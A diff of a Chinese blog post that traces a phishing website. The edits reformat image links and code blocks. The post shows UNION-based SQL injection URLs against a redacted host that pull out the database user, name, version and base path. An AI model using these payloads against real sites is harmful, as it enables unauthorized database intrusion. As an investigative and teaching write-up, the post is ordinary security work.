@@ -12,12 +12,12 @@ permalink: /archivers/Traceability-go-fishing-website-20180714
 
 ## 0x01 溯源准备
 
-  ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714151131.jpg)
+  ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714100404.jpg)
 
 ### 1.1 开始
 
 看到链接下看到后缀php?uid=,初步判断应该是php+mysql的网站..复制链接到电脑浏览器打开后下意识职业病uid=87'
-  ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714101207.png)
+  ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714151131.png)
   
 
 ### 1.2 爆出路径,可能存在sql注入
@@ -50,8 +50,10 @@ permalink: /archivers/Traceability-go-fishing-website-20180714
 
 ### 1.5 联合查询语句，暴出可显示字段
 
->http://www.xxxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,
->14,15,16,17,18,19,20,21,22,23,24,25,26
+<pre><code>http://www.xxxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,
+14,15,16,17,18,19,20,21,22,23,24,25,26</pre></code>
+
+![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714111522.png)
 
 ### 1.6 暴出数据库用户、版本、库名和路径信息.
 
@@ -75,8 +77,7 @@ permalink: /archivers/Traceability-go-fishing-website-20180714
 >
 >@@version_compile_os 操作系统 
 
-
->http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,user(),database(),7,8,version(),10,11,12,@@basedir,14,15,16,17,18,19,20,21,22,23,24,25,26
+<pre><code>http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,user(),database(),7,8,version(),10,11,12,@@basedir,14,15,16,17,18,19,20,21,22,23,24,25,26</pre></code>
 
 ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714122723.png)
 
